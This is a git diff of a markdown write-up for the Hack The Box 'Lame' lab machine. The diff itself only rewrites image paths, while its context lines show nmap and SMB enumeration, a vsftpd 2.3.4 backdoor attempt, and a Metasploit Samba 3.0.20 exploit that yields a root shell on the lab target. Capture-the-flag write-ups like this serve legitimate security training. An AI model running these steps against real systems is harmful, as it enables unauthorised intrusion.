@@ -1,5 +1,5 @@
 
-![logo](logo.png)
+![logo](/logo.png)
 
 # [LAME- BOX]  
 Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 14 Mar 2017 as the first machine on HTB,Lame created by ch4p.So without any further intro, let'sf jump in.
@@ -19,7 +19,7 @@ nmap -sV -sC -oA nmap/lame 10.10.10.3
 
 ###### Output 
 
-![nmap](nmap.png)
+![nmap](/Linux/Linux-Easy/Lame/Screenshots/nmap.png)
 
 ```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 17:52 EAT
@@ -88,7 +88,7 @@ ftp 10.10.10.3
 
 ###### output
 
-![ftp](ftp.png)
+![ftp](/Linux/Linux-Easy/Lame/Screenshots/ftp.png)
 
 We see that their is no files to enumerate, so we look up for potential vulnerabilities of  version `2.3.4` of the service.
 
@@ -100,7 +100,7 @@ searchsploit ftp 2.3.4
 
 ###### output
 
-![searchsploit](searchsploit.png)
+![searchsploit](/Linux/Linux-Easy/Lame/Screenshots/searchsploit.png)
 
 We learn that the version is vunerable to a `backdoor` and can be exploited using `metasploit` and a `python Script` I will Illustrate the two exploits.Let's examine the two exploits we can be able to copy the exploits to our working directories so that we can be able to access it easily.
 
@@ -114,7 +114,7 @@ searchsploit -m 17491
 
 ###### output 
 
-![metasploit](searchsploitmetasplot.png)
+![metasploit](/Linux/Linux-Easy/Lame/Screenshots/searchsploitmetasplot.png)
 
 lets examine the exploit to see how we can enumerate this server 
 
@@ -126,7 +126,7 @@ searchsploit 17491 --examine
 
 ###### output
 
-![examine](searchsploitexamine.png)
+![examine](/Linux/Linux-Easy/Lame/Screenshots/searchsploitexamine.png)
 
 ```rb
 def initialize(info = {})
@@ -164,9 +164,9 @@ set RHOTS 10.10.10.3
 
 ###### output
 
-![metasploitftplame](metasploitftplame.png)
+![metasploitftplame](/Linux/Linux-Easy/Lame/Screenshots/metasploitftplame.png)
 
-![rhostlame](rhostlame.png)
+![rhostlame](/Linux/Linux-Easy/Lame/Screenshots/rhostlame.png)
 
 The exploit failed to land a shell so we move on to the next service .
 
@@ -182,8 +182,8 @@ smbmap -H 10.10.10.3
 
 ###### output
 
-![smbmamplame1](smbmaplame1.png)
-![smbmaplame2](smbmaplame2.png)
+![smbmamplame1](/Linux/Linux-Easy/Lame/Screenshots/smbmaplame1.png)
+![smbmaplame2](/Linux/Linux-Easy/Lame/Screenshots/smbmaplame2.png)
 
 We learn that we have `read/write ` access on the `tmp` share. We access the share using  `smbclient's` anonymous login.
 
@@ -195,7 +195,7 @@ smbclient -N \\\\10.10.10.3\\tmp
 
 ###### output 
 
-![smbclientlame](smbclientlame.png)
+![smbclientlame](/Linux/Linux-Easy/Lame/Screenshots/smbclientlame.png)
 
 But do not see anything of interest. We then use searchsploit to find the vulnerability of samba `3.0.20` 
 # Foothold
@@ -207,7 +207,7 @@ searchsploit samba 3.0.20
 ```
 
 ###### output
-![sambalame](sambalame.png)
+![sambalame](/Linux/Linux-Easy/Lame/Screenshots/sambalame.png)
 
 lets use metasploit exploit as we see an interesting entry of `Remote code Execution (RCE) ` Vulnerablity to exploit the service.
 
@@ -240,7 +240,7 @@ set LHOSTS 10.10.14.4
 
 ###### output
 
-![metasploitlamesamba1](metasploitlamesamba1.png)
+![metasploitlamesamba1](/Linux/Linux-Easy/Lame/Screenshots/metasploitlamesamba1.png)
 
 To use the module, we must set RHOSTS to the target IP address and LHOST to our machine's
 tun0 IP address.
@@ -249,15 +249,15 @@ A listener is started on the designated port, and shortly afterwards, we get a c
 shell on the target system as the root user.
 ###### output
 
-![metasploitlamesamba2](metasploitlamesamba2.png)
+![metasploitlamesamba2](/Linux/Linux-Easy/Lame/Screenshots/metasploitlamesamba2.png)
 
 We successful `pwnd` the box we can now locate the `user flag`  from `/home/makis/`
 
-![userflaglame](userlameflag.png)
+![userflaglame](/Linux/Linux-Easy/Lame/Screenshots/userlameflag.png)
 
 and the `root flag` from `/root/root.txt`
 
-![rootlameflag](rootlameflag.png)
+![rootlameflag](/Linux/Linux-Easy/Lame/Screenshots/rootlameflag.png)
 
 
 
